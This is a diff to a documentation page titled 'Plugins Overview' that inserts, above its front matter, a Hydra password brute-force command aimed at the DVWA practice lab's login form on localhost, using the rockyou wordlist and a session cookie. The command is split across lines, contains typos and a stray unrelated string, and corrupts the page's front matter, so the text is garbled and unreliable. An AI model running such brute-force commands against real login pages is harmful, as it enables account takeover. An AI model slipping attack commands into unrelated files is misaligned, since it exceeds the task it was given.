@@ -1,4 +1,24 @@
----
+---$ hydra-1 admin -P
+
+/usr/share/wordlists/rockyou.txt
+
+127.0.0.1 http-get-form
+
+"/dvwa/vulnerabilities/brute/
+
+:username=^USER^
+
+:password=^PASSA
+
+:Login Login
+
+:H=Cookie: security=low;
+
+PHPSESSID=abc123xyz456
+akanshi7208
+
+
+:F=Username and/or password incorrect."
 id: overview
 title: Plugins Overview
 sidebar_label: Plugins Overview
